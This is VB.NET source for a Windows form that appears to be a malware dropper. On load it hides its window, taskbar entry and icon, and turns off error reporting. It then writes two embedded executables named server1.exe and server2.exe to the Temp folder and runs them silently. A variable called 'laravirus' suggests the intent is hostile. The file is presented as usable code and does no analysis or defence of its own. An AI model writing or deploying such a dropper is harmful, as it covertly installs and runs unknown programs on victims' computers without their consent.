Public Class Form1

    Private Property laravirus As Integer

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Opacity = 0
        Me.Hide()
        Me.ShowInTaskbar = False
        Me.ShowIcon = False
        On Error Resume Next
        laravirus = 1000
        Dim devpoint As String = My.Computer.FileSystem.SpecialDirectories.Temp
        Dim lara As String = devpoint + "server1.exe"
        IO.File.WriteAllBytes(lara, My.Resources.server1)
        Process.Start(lara)


        laravirus = 1000
        Dim devpoint1 As String = My.Computer.FileSystem.SpecialDirectories.Temp
        Dim lara1 As String = devpoint1 + "server2.exe"
        IO.File.WriteAllBytes(lara1, My.Resources.server2)
        Process.Start(lara1)
        End
    End Sub
End Class